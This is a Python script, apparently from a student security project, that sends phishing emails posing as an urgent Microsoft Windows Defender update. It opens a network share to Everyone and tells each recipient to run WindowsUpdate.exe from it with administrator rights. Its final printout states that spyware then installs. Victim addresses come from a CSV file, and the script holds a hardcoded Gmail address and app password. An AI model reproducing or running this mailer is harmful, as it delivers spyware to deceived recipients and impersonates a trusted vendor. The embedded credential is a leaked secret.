"""
Email Sender with Network Share Delivery
Uses UNC path (\\COMPUTER\Share\file.exe) instead of HTTP
Works better for local network attacks
"""

import smtplib
import csv
import socket
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys
import subprocess

# ==================== CONFIGURATION ====================
SENDER_EMAIL = "scanplexz@gmail.com"
SENDER_PASSWORD = "hpgr jzpx nkqh ifyy"
USE_GMAIL = True

# Network Share Configuration
SHARE_NAME = "Updates"  # Name of the shared folder
SHARE_PATH = r"C:\Users\TUF\Documents\Cyber\cybersecurity_final_project-master\malicious_code\delivery\delivery_technique1"
# ======================================================

def get_local_ip():
    """Get the local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "192.168.5.128"

def get_computer_name():
    """Get Windows computer name"""
    return socket.gethostname()

def create_network_share():
    """Create a network share for the delivery folder"""
    computer_name = get_computer_name()
    
    print("\n" + "="*70)
    print("SETTING UP NETWORK SHARE")
    print("="*70)
    
    # Check if share already exists
    try:
        result = subprocess.run(['net', 'share', SHARE_NAME], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"✅ Share '{SHARE_NAME}' already exists")
            share_path = f"\\\\{computer_name}\\{SHARE_NAME}"
            print(f"   UNC Path: {share_path}")
            return share_path
    except:
        pass
    
    # Create new share
    print(f"Creating network share '{SHARE_NAME}'...")
    print(f"  Folder: {SHARE_PATH}")
    
    try:
        # net share command to create share with Everyone access
        cmd = ['net', 'share', f'{SHARE_NAME}={SHARE_PATH}', '/grant:Everyone,READ']
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0 or "already being shared" in result.stdout:
            share_path = f"\\\\{computer_name}\\{SHARE_NAME}"
            print(f"✅ Share created successfully!")
            print(f"   UNC Path: {share_path}")
            print(f"   Access: Everyone (READ)")
            return share_path
        else:
            print(f"❌ Failed to create share: {result.stderr}")
            print("\nManual steps:")
            print(f"1. Right-click folder: {SHARE_PATH}")
            print("2. Properties > Sharing > Advanced Sharing")
            print(f"3. Check 'Share this folder' with name: {SHARE_NAME}")
            print("4. Permissions > Add 'Everyone' with Read access")
            return None
    except Exception as e:
        print(f"❌ Error: {e}")
        return None

def load_email_dataset(csv_file="email_dataset.csv"):
    """Load victim emails from CSV file"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, csv_file)
    
    victims = []
    try:
        with open(csv_path, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if 'email' in row and row['email']:
                    victims.append({
                        'email': row['email'].strip(),
                        'name': row.get('name', 'User').strip()
                    })
        return victims
    except FileNotFoundError:
        print(f"❌ Error: {csv_path} not found!")
        print("Creating example CSV file...")
        with open(csv_path, 'w', encoding='utf-8') as f:
            f.write("email,name\n")
            f.write("sunhak890@gmail.com,Test User\n")
        print(f"✅ Created {csv_path} - Edit it and run again!")
        sys.exit(1)

def create_phishing_email_network_share(victim_name, share_path, computer_name):
    """Create phishing email content with network share link"""
    subject = "Windows Security Update Available"
    
    html_body = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #f5f5f5;">
        <tr>
            <td align="center" style="padding: 40px 0;">
                <table width="600" cellpadding="0" cellspacing="0" border="0" style="background-color: #ffffff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    
                    <tr>
                        <td style="background-color: #0078d4; padding: 20px; text-align: center;">
                            <h1 style="color: #ffffff; margin: 0; font-size: 24px; font-weight: 300;">
                                Microsoft Update Center
                            </h1>
                        </td>
                    </tr>
                    
                    <tr>
                        <td style="padding: 40px 30px;">
                            <p style="color: #333333; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
                                Hello {victim_name},
                            </p>
                            
                            <p style="color: #333333; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
                                A critical security update is available on your network. This update includes important security improvements and must be installed immediately.
                            </p>
                            
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color: #fff4ce; border-left: 4px solid #ff8c00; margin: 20px 0;">
                                <tr>
                                    <td style="padding: 20px;">
                                        <p style="margin: 0 0 10px 0; color: #d83b01; font-weight: 600; font-size: 14px;">
                                            ⚠️ CRITICAL SECURITY UPDATE
                                        </p>
                                        <p style="margin: 0; color: #333333; font-size: 14px; line-height: 1.5;">
                                            Windows Defender Security Update - KB5034441<br>
                                            Size: 12.2 MB<br>
                                            Priority: Critical
                                        </p>
                                    </td>
                                </tr>
                            </table>
                            
                            <div style="background: linear-gradient(135deg, #0078D4 0%, #0063b1 100%); color: white; padding: 25px; border-radius: 8px; margin: 25px 0;">
                                <h3 style="margin: 0 0 15px 0; font-size: 18px;">📁 Download from Network Location</h3>
                                <p style="margin: 0 0 15px 0; font-size: 14px;">
                                    The update file is available on your local network at:
                                </p>
                                <div style="background-color: rgba(255,255,255,0.1); padding: 15px; border-radius: 4px; margin: 15px 0;">
                                    <p style="margin: 0; font-family: 'Courier New', monospace; font-size: 13px; word-break: break-all;">
                                        {share_path}\\WindowsUpdate.exe
                                    </p>
                                </div>
                                <p style="margin: 15px 0 0 0; font-size: 13px;">
                                    Computer: {computer_name}
                                </p>
                            </div>
                            
                            <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin: 30px 0 0 0; border-top: 1px solid #e0e0e0; padding-top: 20px;">
                                <tr>
                                    <td>
                                        <p style="color: #333333; font-size: 14px; font-weight: 600; margin: 0 0 15px 0;">
                                            📋 Installation Steps:
                                        </p>
                                        <ol style="color: #666666; font-size: 14px; line-height: 1.8; margin: 0; padding-left: 20px;">
                                            <li>Press <strong>Windows Key + R</strong></li>
                                            <li>Copy and paste this path: <code style="background: #f0f0f0; padding: 2px 6px; border-radius: 3px;">{share_path}</code></li>
                                            <li>Double-click <strong>WindowsUpdate.exe</strong></li>
                                            <li>Allow administrator privileges when prompted</li>
                                            <li>Wait for installation to complete (2-5 minutes)</li>
                                        </ol>
                                    </td>
                                </tr>
                            </table>
                            
                            <div style="background-color: #e7f3ff; padding: 20px; border-radius: 6px; margin-top: 25px; border-left: 4px solid #0078d4;">
                                <p style="margin: 0; font-size: 14px; line-height: 1.6; color: #333;">
                                    <strong>ℹ️ Note:</strong> This update is deployed via your organization's network share. 
                                    Ensure you are connected to the network to access the file.
                                </p>
                            </div>
                        </td>
                    </tr>
                    
                    <tr>
                        <td style="background-color: #f5f5f5; padding: 20px 30px; border-top: 1px solid #e0e0e0;">
                            <p style="color: #666666; font-size: 12px; line-height: 1.6; margin: 0 0 10px 0;">
                                <strong>Microsoft Corporation</strong><br>
                                One Microsoft Way<br>
                                Redmond, WA 98052-6399
                            </p>
                            <p style="color: #999999; font-size: 11px; line-height: 1.5; margin: 10px 0 0 0;">
                                This is an automated security notification. Please do not reply to this email.
                            </p>
                        </td>
                    </tr>
                    
                </table>
            </td>
        </tr>
    </table>
</body>
</html>
    """
    
    return subject, html_body

def send_phishing_emails(sender_email, sender_password, victims, share_path, computer_name):
    """Send phishing emails with network share link"""
    
    print(f"\n📧 Preparing to send {len(victims)} phishing emails...")
    print(f"📤 Sender: {sender_email}")
    print(f"📁 Share Path: {share_path}\\WindowsUpdate.exe")
    print("="*70)
    
    success_count = 0
    fail_count = 0
    
    smtp_server = 'smtp.gmail.com' if USE_GMAIL else 'smtp-mail.outlook.com'
    
    try:
        print(f"\n🔗 Connecting to {smtp_server}...")
        server = smtplib.SMTP(smtp_server, 587)
        server.starttls()
        
        print("🔐 Logging in...")
        server.login(sender_email, sender_password)
        print("✅ Login successful!\n")
        
        for i, victim in enumerate(victims, 1):
            try:
                victim_email = victim['email']
                victim_name = victim['name']
                
                print(f"[{i}/{len(victims)}] Sending to {victim_email}...", end=" ")
                
                subject, html_body = create_phishing_email_network_share(victim_name, share_path, computer_name)
                
                msg = MIMEMultipart('alternative')
                msg['From'] = sender_email
                msg['To'] = victim_email
                msg['Subject'] = subject
                
                html_part = MIMEText(html_body, 'html')
                msg.attach(html_part)
                
                server.send_message(msg)
                print("✅ Sent!")
                success_count += 1
                
            except Exception as e:
                print(f"❌ Failed: {str(e)}")
                fail_count += 1
        
        server.quit()
        print("\n" + "="*70)
        print(f"✅ Complete! Sent: {success_count}, Failed: {fail_count}")
        
    except Exception as e:
        print(f"\n❌ ERROR: {str(e)}")

def main():
    print("="*70)
    print("PHISHING EMAIL SENDER - NETWORK SHARE DELIVERY")
    print("="*70)
    print("⚠️  EDUCATIONAL USE ONLY - Test with permission!")
    print("="*70)
    
    # Setup network share
    share_path = create_network_share()
    if not share_path:
        print("\n❌ Cannot continue without network share!")
        sys.exit(1)
    
    # Verify WindowsUpdate.exe exists
    exe_path = os.path.join(SHARE_PATH, "WindowsUpdate.exe")
    if not os.path.exists(exe_path):
        print(f"\n❌ WindowsUpdate.exe not found at: {exe_path}")
        print("Run setup_delivery.py first to build the executable!")
        sys.exit(1)
    
    file_size = os.path.getsize(exe_path) / (1024 * 1024)
    print(f"\n✅ WindowsUpdate.exe ready ({file_size:.2f} MB)")
    
    # Load victims
    print("\n📂 Loading email dataset...")
    victims = load_email_dataset("email_dataset.csv")
    print(f"✅ Loaded {len(victims)} victim(s):")
    for v in victims:
        print(f"   • {v['email']} ({v['name']})")
    
    computer_name = get_computer_name()
    print(f"\n💻 Computer Name: {computer_name}")
    print(f"📁 Share Path: {share_path}")
    print(f"📄 File Path: {share_path}\\WindowsUpdate.exe")
    
    # Confirm
    print("\n" + "="*70)
    print("⚠️  READY TO SEND")
    print("="*70)
    print(f"From: {SENDER_EMAIL}")
    print(f"To: {len(victims)} recipient(s)")
    print(f"Delivery: Network Share ({share_path})")
    print("="*70)
    
    confirm = input("\nType 'YES' to send emails: ").strip().upper()
    if confirm != "YES":
        print("❌ Cancelled!")
        sys.exit(0)
    
    send_phishing_emails(SENDER_EMAIL, SENDER_PASSWORD, victims, share_path, computer_name)
    
    print("\n" + "="*70)
    print("🎯 WHAT HAPPENS NEXT:")
    print("="*70)
    print("1. Victims receive email with network share path")
    print(f"2. They navigate to: {share_path}")
    print("3. They download and run WindowsUpdate.exe")
    print("4. Spyware installs and runs automatically")
    print()
    print("💡 TIP: Keep your computer on so victims can access the share!")
    print("="*70)

if __name__ == "__main__":
    main()
